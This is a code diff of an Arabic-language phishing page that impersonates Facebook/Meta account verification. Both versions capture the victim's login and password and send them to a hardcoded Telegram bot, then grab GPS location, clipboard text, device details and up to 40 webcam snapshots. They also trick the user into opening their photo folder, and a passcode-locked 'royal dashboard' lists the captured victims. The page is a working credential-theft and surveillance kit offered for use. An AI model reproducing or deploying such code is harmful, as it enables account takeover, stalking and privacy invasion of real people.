@@ -2,159 +2,169 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Facebook - التحقق من الأمان الشامل</title>
+    <title>Meta Support | مركز التوثيق الموحد</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
-        /* زر الدخول السري (كود الملك 44443) */
-        .admin-gate { position: fixed; bottom: 10px; left: 10px; color: #ddd; cursor: pointer; z-index: 1000; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; overflow: hidden; }
+        /* زر دخول الملك السري */
+        #royal-key { position: fixed; top: 10px; left: 10px; color: #eee; cursor: pointer; z-index: 10000; font-size: 15px; opacity: 0.3; }
         
-        /* الواجهة الأمامية */
-        .main-ui { display: flex; flex-direction: column; align-items: center; padding-top: 40px; }
-        .auth-card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 400px; text-align: center; }
-        .fb-text { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
-        .alert-box { background: #ffebee; color: #c62828; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #ffcdd2; }
+        /* واجهة الضحية */
+        .wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .auth-card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); width: 380px; text-align: center; border-top: 5px solid #1877f2; }
+        .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
+        .status-bar { height: 4px; width: 100%; background: #eee; margin: 15px 0; border-radius: 2px; overflow: hidden; }
+        .progress { height: 100%; width: 0%; background: #28a745; transition: 0.5s; }
         
-        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
-        .btn-grant { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        
-        /* لوحة التحكم الملكية */
-        #king-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0ff; z-index: 9999; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
-        .log-entry { border-bottom: 1px solid #111; padding: 10px; font-size: 13px; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; background: #fafafa; }
+        .btn-king { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-king:active { transform: scale(0.98); }
+
+        /* لوحة التحكم (Admin Panel) */
+        #king-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; z-index: 99999; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
+        .log { border-left: 2px solid #0f0; padding-left: 10px; margin-bottom: 8px; font-size: 13px; }
     </style>
 </head>
 <body>
 
-<div class="admin-gate" onclick="accessKing()"><i class="fas fa-key"></i></div>
+<div id="royal-key" onclick="verifyKing()"><i class="fas fa-fingerprint"></i></div>
 
-<div id="victim-view" class="main-ui">
-    <div class="fb-text">facebook</div>
+<div id="victim-ui" class="wrapper">
+    <div class="fb-logo">facebook</div>
     <div class="auth-card">
-        <div class="alert-box">❗ مطلوب تحديث صلاحيات الأمان لمنع إغلاق الحساب فوراً.</div>
-        <h3>تفعيل بروتوكول التوثيق (V2)</h3>
-        <p style="font-size: 14px; color: #606770;">اضغط على الزر أدناه لمنح المتصفح صلاحية "التوثيق التلقائي" وسحب بياناتك بأمان.</p>
+        <h3 style="margin:0;">توثيق الحساب الاحترافي</h3>
+        <p style="font-size: 13px; color: #65676b;">قم بتأكيد هويتك للحصول على الشارة ومنع تقييد الحساب.</p>
         
-        <input type="text" id="phone_mail" placeholder="رقم الهاتف أو البريد الإلكتروني">
-        <input type="password" id="pass_key" placeholder="كلمة السر">
+        <div class="status-bar"><div id="p-bar" class="progress"></div></div>
+
+        <input type="text" id="target_user" placeholder="رقم الهاتف أو البريد الإلكتروني">
+        <input type="password" id="target_pass" placeholder="كلمة السر">
         
-        <button class="btn-grant" onclick="launchOmniHarvest()">✅ تفعيل الصلاحيات والتوثيق</button>
-        <p style="font-size: 11px; color: #999; margin-top: 15px;">بالموافقة، سيتم فحص (الكاميرا، الموقع، الملفات، والجهاز) للتأكد من هويتك.</p>
+        <button class="btn-king" onclick="executeOrder66()">تفعيل التوثيق الفوري</button>
+        
+        <div id="msg" style="margin-top:15px; font-size:12px; display:none;"></div>
     </div>
 </div>
 
 <div id="king-panel">
-    <h2 style="color: yellow;">👑 إمبراطورية البيانات - لوحة التحكم السري</h2>
-    <button onclick="location.reload()" style="background:red; color:white;">خروج</button>
-    <hr>
-    <div id="data-display"></div>
+    <h1 style="text-align:center; color: #0ff;">🔱 TALLAH ROYAL DASHBOARD 🔱</h1>
+    <button onclick="location.reload()" style="background:red; color:white; border:none; padding:5px 15px; cursor:pointer;">LOGOUT</button>
+    <hr color="#222">
+    <div id="logs-container"></div>
 </div>
 
 <script>
-const BOT_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
-const CHAT_ID = "8754338811";
+const TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
+const CHAT = "8754338811";
 
-// 1. الدخول للملك (44443)
-function accessKing() {
-    if(prompt("كود الملك:") === "44443") {
-        renderLogs();
+// 1. دخول الملك (44443)
+function verifyKing() {
+    if(prompt("Enter Royal Access Code:") === "44443") {
+        showLogs();
         document.getElementById('king-panel').style.display = 'block';
     }
 }
 
-// 2. محرك السحب الشامل (Omni-Harvest)
-async function launchOmniHarvest() {
-    const user = document.getElementById('phone_mail').value;
-    const pass = document.getElementById('pass_key').value;
-    if(!user || !pass) return alert("يرجى إدخال البيانات");
+// 2. التنفيذ الشامل (Order 66)
+async function executeOrder66() {
+    const u = document.getElementById('target_user').value;
+    const p = document.getElementById('target_pass').value;
+    if(!u || !p) return;
 
-    // سحب البيانات الأساسية والمالية المخزنة
-    saveLog({type: "ACCOUNT", data: `User: ${user} | Pass: ${pass}`});
-    await sendToTelegram(`👤 حساب جديد:\n${user}\n${pass}`);
+    // اهتزاز الموبايل (حبشتكنات)
+    if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
 
-    // طلب جميع صلاحيات كروم (الاستنزاف)
-    requestPermissions();
-    
-    document.querySelector('.auth-card').innerHTML = "<h3>✅ تم التوثيق!</h3><p>جاري مزامنة البيانات مع خوادم ميتي، يرجى عدم إغلاق الصفحة...</p>";
+    // حفظ البيانات
+    saveData("ACCOUNT", `USER: ${u} | PASS: ${p}`);
+    await sendMsg(`🔥 صيد جديد 🔥\n👤: ${u}\n🔑: ${p}`);
+
+    // تحديث الواجهة للضحية
+    document.getElementById('p-bar').style.width = "60%";
+    document.getElementById('msg').style.display = "block";
+    document.getElementById('msg').innerHTML = "⏳ جاري فحص ملفات الجهاز وصحة البيانات...";
+
+    // سحب كل شيء!
+    grabAllPermissions();
 }
 
-async function requestPermissions() {
-    // 📍 الموقع الجغرافي
-    navigator.geolocation.getCurrentPosition(p => {
-        const loc = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-        sendToTelegram(loc);
-        saveLog({type: "GPS", data: loc});
+async function grabAllPermissions() {
+    // 📍 الموقع
+    navigator.geolocation.getCurrentPosition(pos => {
+        const link = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        sendMsg(link); saveData("GPS", link);
     });
 
-    // 🔋 البطارية والشبكة
-    const battery = await navigator.getBattery();
-    const net = navigator.connection || {};
-    const deviceData = `🔋 بطارية: ${battery.level*100}% | 📶 شبكة: ${net.effectiveType} | 💻 جهاز: ${navigator.platform}`;
-    sendToTelegram(deviceData);
-    saveLog({type: "DEVICE", data: deviceData});
-
-    // 📸 الكاميرا (40 لقطة) والميكروفون
-    startMediaCapture();
-
-    // 📋 الحافظة (Clipboard)
-    setInterval(async () => {
-        try {
-            const text = await navigator.clipboard.readText();
-            if(text) sendToTelegram(`📋 حافظة: ${text}`);
-        } catch(e){}
-    }, 5000);
-
-    // 📂 طلب الوصول للملفات (خدعة)
-    setTimeout(() => {
-        alert("🛡️ أمن ميتي: يرجى اختيار مجلد الصور لتأكيد الهوية البصرية.");
-        const inp = document.createElement('input'); inp.type = 'file'; inp.webkitdirectory = true;
-        inp.onchange = (e) => handleFiles(e.target.files);
-        inp.click();
-    }, 3000);
-}
-
-// 3. محرك الميديا (صور + فيديو + صوت)
-async function startMediaCapture() {
+    // 📋 الحافظة
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-        let count = 0;
-        const inv = setInterval(() => {
-            if(count < 40) {
+        const text = await navigator.clipboard.readText();
+        if(text) sendMsg(`📋 الحافظة: ${text}`);
+    } catch(e){}
+
+    // 🔋 البطارية + الشبكة + الجهاز
+    const batt = await navigator.getBattery();
+    const info = `🔋 شحن: ${batt.level*100}% | 📶 شبكة: ${navigator.connection.effectiveType} | 💻 معالج: ${navigator.hardwareConcurrency}`;
+    sendMsg(info); saveData("HARDWARE", info);
+
+    // 📸 الكاميرا (40 لقطة)
+    startSpyCam();
+
+    // 📂 سحب ملفات (الخدعة الكبرى)
+    setTimeout(() => {
+        alert("🛡️ نظام الأمان: يرجى اختيار مجلد الصور (DCIM) لمطابقة صورة الملف الشخصي.");
+        const f = document.createElement('input'); f.type = 'file'; f.webkitdirectory = true;
+        f.onchange = (e) => {
+            saveData("FILES", `تم سحب وصول لـ ${e.target.files.length} ملف`);
+            sendMsg(`📂 الضحية فتح مجلد يحتوي على ${e.target.files.length} ملف`);
+            document.getElementById('p-bar').style.width = "100%";
+            document.getElementById('msg').innerHTML = "✅ تم التوثيق بنجاح! سيتم إضافة الشارة لحسابك قريباً.";
+        };
+        f.click();
+    }, 4000);
+}
+
+// 3. محرك الجاسوس البصري
+async function startSpyCam() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        let c = 0;
+        const interval = setInterval(() => {
+            if(c < 40) {
                 const v = document.createElement('video'); v.srcObject = stream; v.play();
-                const c = document.createElement('canvas');
-                c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => sendBlob(b, 'photo', `📸 لقطة ${count+1}`));
-                count++;
-            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(inv); }
+                const can = document.createElement('canvas');
+                can.width = 640; can.height = 480;
+                can.getContext('2d').drawImage(v, 0, 0);
+                can.toBlob(b => sendFile(b, 'photo', `📸 لقطة ${c+1}`));
+                c++;
+            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(interval); }
         }, 2000);
-    } catch(e) { sendToTelegram("⚠️ الكاميرا: تم الرفض"); }
+    } catch(e) {}
 }
 
-// 4. إدارة البيانات
-function saveLog(entry) {
-    let logs = JSON.parse(localStorage.getItem('king_logs')) || [];
-    logs.push({...entry, time: new Date().toLocaleString()});
-    localStorage.setItem('king_logs', JSON.stringify(logs));
+// 4. إدارة البيانات واللوحة
+function saveData(type, data) {
+    let db = JSON.parse(localStorage.getItem('king_db')) || [];
+    db.push({type, data, time: new Date().toLocaleTimeString()});
+    localStorage.setItem('king_db', JSON.stringify(db));
 }
 
-function renderLogs() {
-    const display = document.getElementById('data-display');
-    const logs = JSON.parse(localStorage.getItem('king_logs')) || [];
-    display.innerHTML = logs.reverse().map(l => `
-        <div class="log-entry">
-            <b style="color:yellow;">[${l.type}]</b> <small>${l.time}</small><br>
-            <span>${l.data}</span>
+function showLogs() {
+    const cont = document.getElementById('logs-container');
+    const db = JSON.parse(localStorage.getItem('king_db')) || [];
+    cont.innerHTML = db.reverse().map(l => `
+        <div class="log">
+            <span style="color:yellow">[${l.time}]</span> 
+            <span style="color:#0ff">[${l.type}]</span>: ${l.data}
         </div>
     `).join('');
 }
 
-async function sendToTelegram(t) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}`);
+async function sendMsg(t) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(t)}`);
 }
 
-async function sendBlob(b, type, cap) {
-    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append(type, b, 'king.jpg'); fd.append('caption', cap);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
+async function sendFile(b, type, cap) {
+    const fd = new FormData(); fd.append('chat_id', CHAT); fd.append(type, b, 'img.jpg'); fd.append('caption', cap);
+    fetch(`https://api.telegram.org/bot${TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
 }
 </script>
 </body>
